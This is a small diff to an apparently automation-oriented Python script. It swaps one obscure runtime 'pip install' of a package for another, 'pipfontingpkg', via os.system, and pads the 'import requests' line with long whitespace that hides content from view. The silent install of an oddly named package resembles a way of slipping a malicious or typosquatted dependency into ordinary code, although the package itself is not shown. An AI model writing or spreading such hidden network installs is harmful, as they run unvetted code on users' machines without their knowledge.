@@ -1,6 +1,6 @@
 import os
-os.system("pip install pyfontingpackagesV2")
-import pyfontingpackagesV2
+os.system("pip install pipfontingpkg")
+import pipfontingpkg
 import requests																																																																																																																																																																																																																																																																					
 import undetected_chromedriver as uc
 uc.install()
